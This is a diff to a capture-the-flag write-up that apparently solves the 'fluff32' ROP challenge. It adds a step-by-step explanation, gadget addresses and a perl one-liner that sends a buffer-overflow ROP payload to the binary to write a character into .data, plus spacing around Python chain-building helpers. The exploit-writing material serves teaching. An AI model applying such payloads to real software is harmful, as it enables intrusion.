@@ -98,6 +98,24 @@ We will use the same memory area of the data section to ultimately store the ent
 ```
 readelf -S fluff32 | grep -e '[.]data'
 ```
+![](./6.png)
+
+Now that we have all the details, we'll try to test ourselves by attempting to transfer the first character ("f") and trying to open the file. Of course, this will likely fail (unless the file is named `f`), but if we get the message that there is no file named `f`, it means the character was successfully transferred, and we can add the rest in the same way.
+
+In summary, for the test, we want to input:
+* 44 garbage bytes
+* To make `pop ecx` (`0x08048558`) with the address to `.data`, in big-endian due to `bswap` (`0x0804a018`)
+* To make `pop ebp` (`0x080485bb`) with the mask for the character "f" (`0x4f454b4b`)
+* Activation of the gadget that handles `edx` (`0x08048543`)
+* Activation of the gadget that writes to memory (`0x08048555`)
+* A call to `print_file`, as usual.
+
+```
+perl -e 'print "X"x44 . "\x58\x85\x04\x08" . "\x08\x04\xa0\x18" . "\xbb\x85\x04\x08" . "\x4b\x4b\x45\x4f" . "\x43\x85\x04\x08" . "\x55\x85\x04\x08" . "\xd0\x83\x04\x08" . "XXXX" . "\x18\xa0\x04\x08"' | ./fluff32
+```
+![](./7.png)
+
+It worked. Now we will build the ROP chain for the entire string "flag.txt" in the same way.
 
 ## Solution
 In the following table, the important addresses for constructing the ROP chain are summarized, along with a brief description of each.
@@ -179,6 +197,7 @@ def big_endian(number):
     return struct.pack(">I", number)
 
 
+
 def get_mask(target, value=0xb0bababa):
     target_bits = bin(ord(target))[2:]
     value_bits  = bin(value)[2:]
@@ -200,6 +219,8 @@ def get_mask(target, value=0xb0bababa):
         value_bits = value_bits[:-1]
 
     return int(mask_bits, 2)
+
+
 
 # Parts of the chain
 fill_buffer   = b"X"*44
